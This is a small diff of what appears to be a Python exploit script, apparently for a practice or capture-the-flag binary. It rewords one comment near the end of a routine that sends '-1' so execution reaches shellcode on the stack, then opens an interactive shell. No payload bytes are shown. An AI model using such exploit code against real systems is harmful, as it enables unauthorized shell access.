@@ -74,5 +74,5 @@ if __name__ == "__main__":
     # Now that everything is on the stack, I need to tell the program I'm done sending it input so I can continue execution to my shellcode.
     process_to_exploit.sendlineafter(b"number:", b"-1")
 
-    # Now I can drop into a shell.
+    # And with that, I can drop into a shell.
     process_to_exploit.interactive()
